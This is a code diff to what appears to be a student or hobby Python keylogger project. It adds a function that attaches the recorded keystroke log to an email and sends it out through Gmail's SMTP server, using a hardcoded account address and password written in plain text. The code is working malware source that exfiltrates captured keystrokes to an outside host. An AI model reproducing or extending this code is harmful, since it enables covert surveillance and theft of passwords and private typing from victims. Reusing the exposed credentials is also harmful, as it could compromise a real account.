@@ -75,4 +75,34 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-    
+email_address = "keyloggerproj67@gmail.com"
+email_password = "Higoogle@1167"
+toaddress = "keyloggerproj67@gmail.com"
+
+# Email function to send the key log file.
+def send_email(filename, attatchment, toaddr):
+    fromaddr = email_address
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Keylogger Log File"
+    body = "Please find the attached keylogger log file."
+    msg.attach(MIMEText(body, 'plain'))
+    filename = filename
+    attachment = open(attatchment, "rb")
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload(attachment.read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    msg.attach(p)    
+    server_keylogger = smtplib.SMTP('smtp.gmail.com', 587)
+    server_keylogger.starttls()
+    server_keylogger.login(fromaddr, email_password)
+    text = msg.as_string()
+    server_keylogger.sendmail(fromaddr, toaddr, text)
+    server_keylogger.quit()
+
+send_email(keys_info, file_path + extend + keys_info, toaddress)
+
+
+
